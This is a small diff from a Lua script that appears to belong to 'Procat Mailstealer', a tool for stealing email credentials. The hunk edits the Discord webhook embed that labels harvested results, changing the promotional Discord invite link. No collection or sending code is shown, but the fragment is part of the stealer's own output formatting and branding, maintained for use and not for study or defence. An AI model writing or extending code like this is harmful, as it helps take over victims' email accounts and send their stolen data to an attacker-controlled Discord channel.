@@ -19,7 +19,7 @@ local data1 = {
     ["embeds"] = {
         {
             ["title"] = "```Procat Mailstealer Results```",
-            ["url"] = "https://discord.gg/Qg9SBjXExx",
+            ["url"] = "https://discord.gg/mailstealer",
             ["description"] = "```This data was generated using Procat Mailstealer```",
             ["type"] = "rich",
             ["color"] = tonumber(0xBE30F7),
